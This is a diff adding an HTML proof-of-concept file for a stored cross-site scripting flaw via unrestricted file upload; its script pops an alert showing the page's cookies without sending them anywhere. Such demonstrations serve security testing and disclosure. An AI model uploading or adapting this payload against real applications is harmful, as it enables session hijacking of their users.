@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS PoC</title></head>
+<body>
+<h1>Stored XSS Proof of Concept</h1>
+<p>If you see an alert box, this file executed as a script in the app's origin.</p>
+<script>
+  alert("Stored XSS via unrestricted file upload. Cookie: " + document.cookie);
+</script>
+</body>
+</html>
